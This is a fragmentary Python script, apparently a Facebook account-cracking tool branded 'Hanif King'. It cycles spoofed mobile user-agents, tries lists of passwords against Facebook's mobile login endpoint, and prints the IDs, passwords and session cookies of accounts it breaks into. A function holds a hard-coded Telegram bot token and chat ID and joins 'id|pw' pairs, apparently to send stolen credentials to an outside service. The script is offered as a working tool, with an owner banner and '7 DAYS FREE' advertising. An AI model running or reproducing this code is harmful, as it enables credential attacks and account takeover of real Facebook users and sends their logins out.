...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; M865C Build/HuaweiM865C) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",]
ua = ["Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; M865C Build/HuaweiM865C) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 BingWeb/5.2.0.20140710",]
ua = ["Mozilla/5.0 (Linux; U; Android 12; th-th; Redmi 10 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0.5-gn",]
ua = ["Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;",]
ua = ["Mozilla/5.0 (Linux; Android 13.0; SM-S24 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.4638.74 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
...
def Hanif(id,pw):
    try:
        token = "6607036064:AAHE8BCZE-jaDd3MxiXs4SvPXLDDwvnoa08"#Add yout token 
        chatid = "5168163383"#Add your Chat Id
        ok_id =str(id+"|"+pw)
...
os.system('espeak -a 300 " hello welcome to, Hanif King ,  Tools"')
...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING BOTH  ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;91m------------------------------------------------
\033[0;95m Owner   :     HANIF BIN WALID  
\033[1;96m Facebook:     DEAD BODY OFFICIALS 
\033[1;96m Github  :     HANIF540
\033[0;91m Version :     V.1.0
\033[0;95m Tool Type :   7 DAYS FREE
\033[0;91m------------------------------------------------\033[1;31m""")
def login():
	banner()
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN Salam\n\x1b[1;97m [1] METHOD Salam ')
	os.system('espeak -a 300 " 1,  method,  Assamulikum"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[HANIF-HD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&pdr')
    ...
    'user-agent': ua,}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Hanif-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
